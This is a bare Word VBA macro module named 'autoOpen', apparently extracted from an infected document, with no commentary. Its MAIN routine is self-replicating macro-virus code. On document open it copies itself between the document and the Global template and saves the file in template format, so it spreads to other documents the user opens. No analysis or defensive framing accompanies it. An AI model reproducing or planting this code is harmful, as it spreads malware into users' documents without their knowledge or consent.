   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoOpen"

   Public Sub MAIN()
   Dim f1$
   Dim g1$
   WordBasic.FileSummaryInfo Update:=1
   Dim d1 As Object: Set d1 = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo d1
   f1$ = d1.Directory + "\" + d1.FileName + ":autoOpen"
   g1$ = "Global:autoOpen"
   If UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 4)) = ".DOT" Then
   WordBasic.MacroCopy g1$, f1$
   WordBasic.FileSaveAs Format:=1
   Else
   WordBasic.MacroCopy f1$, g1$
   End If
   End Sub
